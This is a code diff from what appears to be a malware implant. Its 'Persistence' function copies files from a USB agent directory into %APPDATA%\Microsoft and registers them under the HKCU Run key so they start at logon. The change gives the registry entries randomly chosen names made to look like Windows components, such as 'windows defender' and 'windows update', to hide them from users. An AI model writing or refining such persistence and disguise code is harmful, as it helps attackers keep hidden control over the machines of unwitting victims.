@@ -13,7 +13,7 @@ import random
 def Persistence(agentUsbDirectory):
     targetDirPath = os.environ["APPDATA"] + "\\Microsoft"
     targetRegisterPath = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-    targetRegisterVersion = " /v update"
+    targetRegisterVersion = [" /v windows update", "/v windows tasks", "/v windows system", "/v windows defender"] 
     targetRegisterType = " /t REG_SZ"
 
     if not os.listdir(agentUsbDirectory):
@@ -27,7 +27,7 @@ def Persistence(agentUsbDirectory):
                     if os.path.exists(targetDirPath + "\\" + files) == True:    
                         if os.path.getsize(targetDirPath + "\\" + files) > 0:
                             targetFile = " /d " + targetDirPath + "\\{0}".format(files)
-                            targetRegisterVersion = "{0}{1}".format(targetRegisterVersion, random.choice(string.ascii_lowercase))
+                            targetRegisterVersion = "{0}".format(random.choice(targetRegisterVersion))
                             try:
                                 subprocess.run(targetRegisterPath + targetRegisterVersion + targetRegisterType + targetFile, shell=True, timeout=3)          
                             except Exception as e:
